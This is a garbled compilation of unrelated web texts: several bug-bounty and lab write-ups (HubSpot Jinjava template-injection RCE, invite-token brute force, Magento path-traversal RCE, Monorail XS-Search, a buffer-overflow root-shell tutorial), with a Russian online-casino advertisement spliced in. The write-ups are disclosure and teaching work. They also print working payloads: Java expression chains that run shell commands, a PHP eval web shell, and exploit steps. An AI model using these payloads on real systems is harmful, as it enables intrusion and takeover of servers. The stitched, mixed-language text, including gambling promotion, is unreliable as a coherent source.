Here’s the full content:\n\nRCE in Hubspot with EL injection in HubL Skip to main content { Better } Hacker \"I don't believe you have to be better than everybody else. I believe you have to be better than you ever thought you could be.\" Search Search This Blog Pages Home About {ME} Projects More… RCE in Hubspot with EL injection in HubL December 07, 2018 This is the story of how I was able to get remote code execution on Hubspot 's servers by exploiting a vulnerability in HubL expression language , which is used for creating templates and custom modules within the Hubspot CRM. I had absolutely no experience with these kinds of vulnerabilities before and it turned out to be a very interesting learning opportunity. In this post, I go through the process I followed while researching and how little pieces were connected together to achieve a much bigger goal. Getting started While working on the Hubspot's bugbounty program, I came across a functionality which looked very interesting. Users can create custom designs for emails or blogs from the design manager and can use HubL expression language in their templates. Because HubL is a markup language, I began with the payload {{7*7}} and got a nice '49' back which means the server was treating anything within two curly brackets as HubL code. Bear in mind, at this point I didn't know anything about expression languages or HubL so I decided to fuzz the input and see what template engine is being used at server side by following the method posted at PortSwigger blog Interestingly the output didn't follow any known pattern and I reached \"Unknown\" or \"Not Vulnerable\". Giving up after a few tries is lame, so I decided it was time to RTFM ! HubL Intro: This is a very high level intro to HubL expression language and I am by no means an expert. The following section contains just enough information to understand what was happening and how I exploited the bug. The following 3 types of delimiters are used to separate HubL and HTML within the module's code. {% %} - statement delimiters HubL statements are used to create editable modules, define conditional template logic, set up for loops, define variables, and more. {{ }} - expression delimiters Anything between expression delimiters {{ }} will be evaluated by the templating engine, and thats what I was more interested in. {# #} - comment delimiters Anything between the {# #} will be commented out or ignored by the parser. Variables: There are some built in variables such as {{ account }}, {{ company_domain }}, {{ content }} etc which can be used within a module. The parser replaces these variables with their actual values at runtime. e.g. {{ company_domain }} will be replaced by Your Company's domain name. Users can also declare custom variables within statement {% %} blocks and these can be used within expression {{ }} blocks just like built-in variables. Another interesting thing to note here is that the documentation says HubL is based on Jinja but as observed before, the output wasn't following normal Jinja pattern when evaluating the expressions. Let the hacking begin! For all below examples, the payload was submitted in template_source parameter in the POST request and its output was seen in output_html & html fields. After trying most of the built in variable names, I stumbled upon an undocumented variable: \"request\" which returned an interesting string. Payload : {{ request }} Output: com.hubspot.content.hubl.context.TemplateContextRequest@23548206 Nice! This looks like the memory location of the 'request' object! And it also looked like Java from the naming convention. After some Google searches, I tried the following payloads to verify if its a Java based template engine: Convert a string to upper case - Payload: {{'a'.toUpperCase()}} Output: A Concatenate two characters - Payload: {{'a'.concat('b')}} Output: ab Awesome! This looked very promising. The template engine not only parses its own syntax, it also allows us to call built-in methods. The Vulnerability Trying to get the class of a character - Payload: {{'a'.getClass()}} Output: java.lang.String Excellent! Java is confirmed! The vulnerability here is that it was possible to call the getClass() method on any object. At this point I was sure this could be exploited to something bigger. But before shooting for the moon, I wanted to understand how expression language works so I started by gathering more information: Get class of the request object - Payload: {{request.getClass()}} Output: class com.hubspot.content.hubl.context.TemplateContextRequest Get declared methods of a class ( increment from 0 to any number to get all the methods) - Payload: {{request.getClass().getDeclaredMethods()[0]}} Output: public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug() At this point, I searched for \" com.hubspot.content.hubl.context.TemplateContextRequest\" and discovered the Jinjava project on Github . Looking at the class declaration in the source, I was also able to call methods from the request class - Payload: {{request.isDebug()}} Output: false To take it a step further, I learnt that you can use the forName() and newInstance() methods to get an instance of a completely different class - Using string 'a' to get an instance of class sun.misc.Launcher - Payload: {{'a'.getClass().forName('sun.misc.Launcher').newInstance()}} Output: sun.misc.Launcher@715537d4 It is also possible to get a new object of the Jinjava class - Payload: {{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}} Output: com.hubspot.jinjava.JinjavaConfig@78a56797 It was also possible to call methods on the created object by combining the {% %} and {{ }} blocks - Payload: {% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}{{ji.render('{{1*2}}')}} Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}. Output: 2 Jinjava Inception! I now had enough understanding and was ready to get the coveted remote code execution. From what I'd read, that should be easy. Just create an object of java.lang.Runtime class and call the exec() method on it. So.... Payload: {{'a'.getClass().forName('java.lang.Runtime').newInstance()}} Output: TemplateSyntaxException: java.lang.IllegalAccessException: Class javax.el.BeanELResolver can not access a member of class java.lang.Runtime with modifiers \"private\" Bummer! Looks like Runtime is blocked. To make sure I am not missing anything, I tried getting the declared methods of the Runtime class with getDeclaredMethods call and it worked fine, meaning that calling the newInstance() method on java.lang.Runtime class was not allowed. Knowing Java's history, I was pretty sure there will be another way. Time to find an alternative. First option: java.lang.System Payload: {{'a'.getClass().forName('java.lang.System').newInstance()}} Ouput: TemplateSyntaxException: java.lang.IllegalAccessException: Class javax.el.BeanELResolver can not access a member of class java.lang.System with modifiers \"private\" Arrggh... one more candidate lost. After frantic searches and asking around, I found this gem of a blog which introduced to me to javax.script.ScriptEngineManager. Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance()}} Output: javax.script.ScriptEngineManager@727c1a89 Amazing! So I got an object of ScriptEngineManager means RCE was on the horizon. But before that, I had to get to know my new friend ScriptEngineManager . Find out what type javascript engine this is - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript')}} Output: jdk.nashorn.api.scripting.NashornScriptEngine@7f97607a A bounty writeup without a meme is not fun! Get the script context - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').getContext()}} Output: jdk.nashorn.api.scripting.NashornScriptEngine@7f97607a Get language name - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineFactories()[0].getLanguageName()}} Output: ECMAScript Get language version - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineFactories()[0].getLanguageVersion()}} Output: ECMA - 262 Edition 5.1 Now go for the kill. To get RCE using the ScriptEngineManager, you have to run the ever so useful \"eval\" method with some Java code thrown into it. After a lot of trial and errors, I finally got eval to work. Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}} Output: xxx I successfully evaluated dynamic java code using ScriptEngineManager instance! Now I only need to substitute real code that will execute system commands and throw it into eval. After another trial and error session, I finally had some success - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}} Output: java.lang.UNIXProcess@1e5f456e Woot! The output was a reference to a UNIXProcess object which means my command was successfully executed! I could have now ran a reverse shell command and obtained a shell but since I was able to see the output, I decided to push this a little more and get the command's output in response itself. Another frantic search session resulted with the discovery of org.apache.commons.io.IOUtils . This class provides static utility methods for input/output operations. My final payload was - {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}} Output: See for yourselves! Bingpot! It took me a few more tries to learn how to pass multiple arguments to the commands. Notice the x.command function! - Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}} Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\\n As you can imagine, it was quite a struggle but in the end I had a lot of fun and learnt a lot in the process. The Jinjava project was introduced by Hubspot back in 2014 , that means this bug had been around 4 years in nobody found it (hopefully). The Hubspot team was very receptive and fixed it very fast by disabling the \"getClass\" method on a variable. You can find the fix here . Bonus A couple of days after fixing the vulnerability, Hubspot informed me that since \" Jinjava \" - an open source project - is being used by many other companies apart from Hubspot, they have applied for a CVE and I will be credited in it for the discovery of this issue!

Here is the story of how chaining simple issues and poor design flaws can result in account take over, privilege escalation and ultimately organization take-over. While working on a private program i was testing a product on redacted.com which is basically an app to view and manage all business data collected from several apps in one place (just imagine how much valuable data is in there). Companies are able to create a work space or organization within this app, an admin would then invite users to join. I often start with testing the invite functionality as it often result in critical issues. There are only two possible roles either user or admin, at first the invite flow seemed solid CSRF protection was in place CORS were configured properly it seemed like nothing was there and everything worked fine until, i found the first issue, there was a huge problem with the invite system, if an admin invites an external user the invitation link looked like this https://login.redacted.com/accounts/?service=product&digest=saaOBeXStZDRqgVlSRPAgPSY0 Pretty solid right? Next I tried to invite a user that has an existing account on redacted.com and as it turns out the resulting invitation was quite different the link looked like this https://product.redacted.com/invitations?inviteId=160000002637191&type=accept&source=mail No signature no hash nothing!!! Wait WHAAAAAAT!!!!! You can see where this is going. First, let me putin on my special glasses before we dive in. With further inspection i came to a conclusion that the first 12 digits refers to the organization and the last 3 are the invitation id in this case 160000002637 is the organization id while 191 is the invitation id. That is easily brute-forceable. With some more tests i figured that not only this id is bruteforceable it didn’t expire if another person used it so if admin sends invitation to X email but attacker bruteforce the token he could join the organization with email Y, Z and N emails the invite would sill be valid until email X is used. It meant that an attacker can bruteforce token infiltrate organization and the admin would still see invitation as pending, cool ha! So to summarize this part here is the scenario Admin of org sends invitation to User A with email X Attacker bruteforce invitation ID Attacker signup with email Y Attacker is inside org Admin will see that the invitation is still pending You would think OK how this would result in an organization takeover or privilege escalation, the app had also another issue, a user can view pending invitations and their roles once he finds an admin invitation he could exploit it and takeover the hole thing using the disclosed email address. In other words this would drastically decrease bruteforce attack, once he found a single valid token he would stop bruteforcing join the organization if the invite was for an admin then he hit a jackpot if the invite was for a user he would simply keep checking the pending invites section until he finds an admin invite, given the fact that an org can have large number of users, there is a great chance he would remain unnoticed. As a bounty hunter you should look into functional bugs too as these bugs can result in a critical business impact.

Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается.

Ведь хочется, чтобы всё было честно, безопасно и увлекательно.

Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита.

Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям.

Here is a second paper which covers two vulnerabilities I discovered on Magento, a big ecommerce CMS that’s now part of Adobe Experience Cloud. These vulnerabilities have been responsibly disclosed to Magento team, and patched for Magento 2.3.0, 2.2.7 and 2.1.16. Both of vulnerabilities need low privileges admin account, usually given to Marketing users : The first vulnerability is a command execution using path traversal, and requires the user to be able to create products The second vulnerability is a local file read, and requires the user to be able to create email templates Here are the details ! Command Execution in Product Creation Magento has its own way to define the layout of a product, into the Design tab of the Product creation system. It’s format is XML-based and follows a syntax documented by Magento themselves. The full documentation is here : https://devdocs.magento.com/guides/v2.3/frontend-dev-guide/layouts/xml-instructions.html The interesting thing is the possibility to instantiate blocks with the <block> tag, and then to call methods on it with the <action> tag. This will only work if the object implements the Block interface, by the way. However, I was searching if there’s anything interesting to do with this, and saw the following function for class Magento\\Framework\\View\\Element\\Template : /** * Retrieve block view from file (template) * * @param string $fileName * @return string */ public function fetchView($fileName) { $relativeFilePath = $this->getRootDirectory()->getRelativePath($fileName); \\Magento\\Framework\\Profiler::start( 'TEMPLATE:' . $fileName, ['group' => 'TEMPLATE', 'file_name' => $relativeFilePath] ); if ($this->validator->isValid($fileName)) { $extension = pathinfo($fileName, PATHINFO_EXTENSION); $templateEngine = $this->templateEnginePool->get($extension); $html = $templateEngine->render($this->templateContext, $fileName, $this->_viewVars); } else { $html = ''; $templatePath = $fileName ?: $this->getTemplate(); $errorMessage = \"Invalid template file: '{$templatePath}' in module: '{$this->getModuleName()}'\" . \" block's name: '{$this->getNameInLayout()}'\"; if ($this->_appState->getMode() === \\Magento\\Framework\\App\\State::MODE_DEVELOPER) { throw new \\Magento\\Framework\\Exception\\ValidatorException( new \\Magento\\Framework\\Phrase( $errorMessage ) ); } $this->_logger->critical($errorMessage); } \\Magento\\Framework\\Profiler::stop('TEMPLATE:' . $fileName); return $html; } This code is responsible for loading templates from file; there’s two extension authorized that are phtml (to treat it as PHP template file) and xhtml (to treat it as plain HTML file I imagine?). Obviously, we want the PHP thing, that’s more fun. The $fileName parameter is passed into the \\Magento\\Framework\\View\\Element\\Template\\File\\Validator::isValid() function, that checks if the file is in certain directories (compiled, module or themes directories). This check used the isPathInDirectories to do so : protected function isPathInDirectories($path, $directories) { if (!is_array($directories)) { $directories = (array)$directories; } foreach ($directories as $directory) { if (0 === strpos($path, $directory)) { return true; } } return false; } This function only checks if the provided path begins by a specific directory name (ex: /path/to/your/magento/app/code/Magento/Theme/view/frontend/ ). However, it does not control that’s the resolved path is still in those whitelisted directories. That means there’s an obvious path traversal in this function that we can call through a Product Design. However, it will only process .phtml file as PHP code, which is a forbidden extension on most upload forms. “Most of upload forms” means there’s exception! You can create a file with “Custom Options”, and one is “File”. I imagine this is in case the customer wants to send a 3D template or instructions for its order. The real reason isn’t that important, the fact is that you can allow extensions you want to be uploaded, including phtml . Once the item is ordered, the uploaded file will be stored in /your/path/to/magento/pub/media/custom_options/quote/firstLetterOfYourOriginalFileName/secondLetterOfYourOriginalFileName/md5(contentOfYourFile).extension This is sufficient for having a command execution payload. Here is the complete steps : Log in with a user that has some low admin privileges and is allowed to create products First of all, create a new product, with a new Custom Options of type File , with .phtml as an authorized extension and some pieces in stock to order one. Go on the frontend, on the product you just created. Upload your .phtml and set the item in your cart. For example, my file is named “ blaklis.phtml ” and contains “ <?php eval(stripslashes($_REQUEST[0])); ?> “ The .phtml file is uploaded to /your/path/to/magento/pub/media/custom_options/quote/ firstLetterOfYourOriginalFileName / secondLetterOfYourOriginalFileName / md5(contentOfYourPhtmlFile) .phtml . For example, for my file, the location will be /your/path/to/magento/pub/media/custom_options/quote/b/l/11e48860e4cdacada256445285d56015.phtml You must have the full path to the application to use the fetchView function. An easy way to retrieve it is to run the following request : POST /magentoroot/index.php/magentoadmin/product_video/product_gallery/retrieveImage/key/[key]/?isAjax=true HTTP/1.1 [...] Connection: close remote_image=https://i.vimeocdn.com/video/41237643_640.jpg%00&form_key={{your_form_key}} This will make CURL crash and display an error with full path in it In the design tab of the product, add a 2 column layouts with the following XML in Layout Update XML : <referenceContainer name=\"sidebar.additional\"> <block class=\"Magento\\Backend\\Block\\Template\" name=\"test\"> <action method=\"fetchView\"> <argument name=\"fileName\" xsi:type=\"string\">/path/to/your/magento/app/code/Magento/Theme/view/frontend/../../../../../../pub/media/custom_options/quote/b/l/11e48860e4cdacada256445285d56015.phtml</argument> </action> </block> </referenceContainer> Go to the frontend page of this product; your code should executed. This flaw was not that obvious, but has been fun to search for! Local File Read in Email Templating This one is a lot easier; in fact, it was a pretty obvious one. Email templating allow to use some special directives, surrounded by {{ }} . One of these directives is {{css 'path'}} to load the content of a CSS file into the email. The path parameter is vulnerable to path traversal, and can be used to inject any file into the email template. The functions that are managing this directive are the following : public function cssDirective($construction) { if ($this->isPlainTemplateMode()) { return ''; } $params = $this->getParameters($construction[2]); $file = isset($params['file']) ? $params['file'] : null; if (!$file) { // Return CSS comment for debugging purposes return '/* ' . __('\"file\" parameter must be specified') . ' */'; } $css = $this->getCssProcessor()->process( $this->getCssFilesContent([$params['file']]) ); if (strpos($css, ContentProcessorInterface::ERROR_MESSAGE_PREFIX) !== false) { // Return compilation error wrapped in CSS comment return '/*' .

Other projects include Angle, PDFium, Gerrit, V8, and the Alliance for Open Media. It is also used by Project Zero, Google’s 0-day bug-finding team. This article is a detailed explanation of how I could have exploited Google’s Monorail issue tracker to leak sensitive information (vulnerable source code files and line numbers) from private bug reports through a XS-Search attack. Where to start? One of the first functionalities I looked into when analyzing Monorail was the ability to download the result of a certain search query as a CSV. It didn’t take me long to notice that it was vulnerable to a CSRF attack. In other words, it was possible to force an user to download a CSV containing the results of a search query if a malicious link was accessed. Press enter or click to view image in full size https://bugs.chromium.org/p/chromium/issues/csv?can=1&q=Restrict=View-SecurityTeam&colspec=ID As seen in the image, there were no protections against CSRF attacks. So, for example, a request made with the “Restrict-View-SecurityTeam” tag would end up filtering the results to undisclosed security-related issues only. If a member of the Google security team or a high profile bug reporter were to access this link, they would download a CSV containing all undisclosed issues they have access to. Duplicate and conquer Another important discovery was that columns displayed in a search result could be duplicated, allowing us to arbitrarily increase the length of the generated CSV. To illustrate, if we were to access the URL below: https://bugs.chromium.org/p/chromium/issues/csv?can=1&q=id:51337&colspec=ID+ Summary + Summary + Summary The downloaded CSV would contain 3 repeated Summary columns, instead of only one. Press enter or click to view image in full size CSV generated from a query containing the “Summary” column 3 times. Come again? A XS-Search attack? Combining these two vulnerabilities we have all that is needed to perform a Cross-Site Search (XS-Search) attack: Capacity to perform complex search queries. Capacity to inflate the response of a search query. The second point is particularly important. If the response of a search query matches a bug, we can make the CSV significantly bigger than a query that doesn’t. Because of this big difference in response length, it’s possible to calculate the time each request takes to complete and then infer whether the query returned results or not. This way, we achieve the ability to ask cross-origin boolean questions. The phrase “cross-origin boolean questions” sounds weird, but it essentially means we’re able to ask questions like “is there any private bug that matches the folder `src/third_party/pdfium/`?” and obtain the answer cross-origin. This involves several steps that will be described in the following section. For now, the examples below demonstrate the core of the issue: Press enter or click to view image in full size 1st case — CSV generated from query “Summary: This bug exists”. Press enter or click to view image in full size 2nd case — CSV generated from query “Summary: This bug doesn’t exist”. Press enter or click to view image in full size 3rd case — CSV generated from query ”Summary: This bug exists OR Summary: This bug doesn’t exist“. As we can see, on the first and third case we would have an arbitrarily big CSV, because both queries match a bug with summary “This bug exists”. On the second case, the CSV would be empty (containing only the header), because the query didn’t match any bug with the Summary “This bug doesn’t exist”. Note that in the third case we are using the logic operator OR to query the first and second cases together. To ask or not to ask? One of the problems I had when trying to create a PoC was deciding what to search. Monorail’s search doesn’t allow us to query for specific letters in a report, only words. This meant that we couldn’t bruteforce the report char by char. After realizing this, I had to take a step back and search older bug reports looking for information that was relevant and could realistically be exfiltrated by the attack. That’s when I learned that many Chromium bug reports indicate the file path and line number where the vulnerability can be found. Press enter or click to view image in full size Example from https://bugs.chromium.org/p/chromium/issues/detail?id=770148 That’s perfect for a XS-Search attack: since the folder structure of Chromium is public and Monorail treats slashes as words delimiters (a query for “path/to/dir” also includes results for bugs containing the string “path/to/dir/sub/dir”), we can easily generate the appropriate search queries. So our attack would look something like this: We find out if there’s any private bug report that mentions a file in Chromium’s source tree. We do this using https://cs.chromium.org/chromium/src / as the base query. We search for the first half of all the directories under src/ using the OR operator (e.g. src/blink OR src/build… ). We keep repeating step 2 using the binary search algorithm. If anything was found (i.e. a big CSV was generated), we restrict the search space to the first half. Otherwise (i.e., an empty CSV was generated), we restrict the search space to the second half. After eliminating all directories but one, we restart step 2, but now adding the newly found directory to the end of the base query. At the end of this process, the full URL will have been leaked and we can now (as an attacker) look into the corresponding file and try to find the vulnerability that was reported. One request to rule them all You might be wondering how we obtained the size of the CSV in step 3. Since the Same-Origin policy forbids us from accessing information across different origins, a naive response.length won’t work. While we can’t know for sure the exact size of a response, we can measure the time each request takes to complete. Using the response-length inflation technique covered in previous sections, searches returning a bug would be a lot slower to finish than ones that do not. However, to achieve a high degree of certainty, simply doing one request isn’t enough. We would need to request the same page many times and measure the average response time to obtain a reliable exploit. That’s when the Cache API comes in handy, by only making one request and repeatedly calculating the duration that the response takes to be cached it’s possible to infer, with certainty, if the result of the search query returned bugs or not. In other words, a small response takes less time to be cached than a bigger response. Given there are almost no limitations to the Cache API (and it being extremely fast), we can cache and measure the same response several times, and then compare it with the measurements of a known empty search query result, which allows us to easily differentiate a large response from a small/empty one, filtering out hardware and network variances, increasing the exploit’s speed and reliability. For more information on how this can be implemented you can check the exploit’s code . Aftermath In total, I found three different places where this attack could be carried on, which resulted in CVE-2018–10099, CVE-2018–19334 and CVE-2018–19335. I was also rewarded $3133,7 for each vulnerability, totaling over $9400.

It shows how one can use a buffer overflow to obtain a root shell. The end of the tutorial also demonstrates how two defenses in the Ubuntu OS prevent the simple buffer overflow attack implemented here. This tutorial leverages the paper written by alephOne on buffer overflows: http://cecs.wright.edu/~tkprasad/courses/cs781/alephOne.html Initial Setup of the Virtual Machine Let us first go through the initial setup of the virtual machine used to experiment with buffer overflow. The virtual machine used runs Ubuntu OS 12.04 LTS . To make our attack easier, we first need to disable address space randomization, a defense against buffer overflows making guessing addrsses in the heap and stack more difficult. To do so, we simply need to run the following command under root privileges: su root sysctl -w kernel.randomize_va_space=0 A confirmation of the variable's value is printed kernel.randomize_va_space = 0 by the terminal. Example of a Shellcode The file call_shellcode.c containes an example shellcode, which allows one to store a char in a buffer and then call the shell by a buffer overflow. To run the shell, we can compile call_shellcode.c using the executable stack option in gcc . Running the program ./call_shellcode from the terminal starts a shell, which can for instance be used to run programs (e.g., vim ). This shellcode was however not injected so this example does not really correspond to a realistic threat model. Instead, we now show how one can inject the buffer using a file loaded by a vulnerable program. Vulnerable Program The vulnerable program is provided in the stack.c file. It needs to be made a set-root-uid in order for the adversary exploiting the buffer overflow to be able to gain access to a root shell. For that purpose, we compile the file using root privileges. Furthermore, if GCC>4.3.3 is used, since the Stack Guard option is enabled by default, one needs to disable it at compile time (cf. below). Note that we also use the executable stack option (to be able to run our shellcode from the buffer). Finally, to make the file executable, we chmod the permissions to 4755 on the compiled program stack . su root gcc -o stack -z execstack -fno-stack-protector stack.c chmod 4755 stack Exploiting the Vulnerability: Demonstration of the Buffer Overflow Attack We now need to craft the badfile file that will be read by this vulnerable program 'stack' and stored in the buffer, which will be overflowed. The file exploit.c contains code that dumps the buffer that will be read by the vulnerable program. The code is well commented and should be fairly understandable and leverages sample code provided in the paper by alephOne. To demonstrate the buffer flow attack, we run the following commands: gcc -o exploit exploit.c ./exploit ./stack This simply compiles and runs the exploit file. The exploit file evaluates the stack pointer and crafts a buffer (with the stack pointer and the shellcode) and saves it to badfile . The vulnerable program stack is then executed, it reads the file badfile and loads the buffer, which triggers the buffer overflow and executes the shellcode, thus giving us a root shell (designated by # ). Note that the root shell we have obtained is still using our user ID, as proved by running the id command. To solve this and have both the real and effective user ids set to root, one can run the included set_uid_root.c file. Address Randomization: a first defense One can set Ubuntu's address randomization back on using: $ su root # /sbin/sysctl -w kernel.randomize_va_space=2 Running the attack described in the previous section gives a segmentation fault (core dumped) error because the address is randomized each time the program is executed. Therefore, the stack pointer is different and the exploit.c program will not set the address properly anymore for the buffer flow to run the shellcode. Stack Guard: a second defense To analyze one defense at a time, it is best to first turn off again address randomization, as performed in the initial setup. One can then repeat the buffer overflow attack but this time compiling the vulnerable program stack with the Stack Guard protection mechanism (i.e. removing the flag previously used: -fno-stack-protector ). su root gcc -o stack -z execstack stack.c This time, the Stack Guard option 